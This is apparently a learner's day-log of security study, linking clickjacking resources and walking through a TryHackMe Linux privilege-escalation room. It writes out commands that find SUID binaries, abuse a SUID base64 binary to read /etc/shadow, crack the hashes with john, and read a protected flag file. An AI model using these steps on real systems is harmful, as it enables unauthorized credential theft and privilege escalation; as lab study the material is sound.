🎯 Day 10 Task


✅ Clickjacking 


https://www.youtube.com/watch?v=Unu41TIk8CY

✅ Poc


https://www.youtube.com/watch?v=rz2XmteeFMo


✅ Writeup


https://medium.com/@raushanraj_65039/google-clickjacking-6a04132b918a


https://hackerone.com/reports/299009


🔁 TryHackMe Room


➡️ Working on Linux PrivEsc


✅ Completed Task 7 Privilege Escalation SUID


😒 I Saw a Walkthrough bcoz this is my 1st PrivEsc 

Some Tips: 


**cat /etc/passwd** me se user ka naam mila (1st answer)


Command for listing the binaries file which has SUID & SGID bits 


**find / -type f -perm -04000 -ls 2>/dev/null**


Har 1 Binary ko gtfobins me dekha koi SUID ke saath exploit hai kya **base64** mila 


Fir **LFILE=/etc/shadow**


**/usr/bin/base64 “$LFILE” | base64 –decode** : karke passwd ka hash nikala & then Hash ko ek file me save kiya **hash.txt**


**john hash.txt --show** : mil gaya passwd


**su user2 & passwd**


**cd home/ubuntu**


**cat flag3.txt** but permission denied then 


Then try **LFILE=/home/ubuntu/flag3.txt**


**/usr/bin/base64 “$LFILE” | base64 –decode**


**cat flag3.txt** & got flag :)



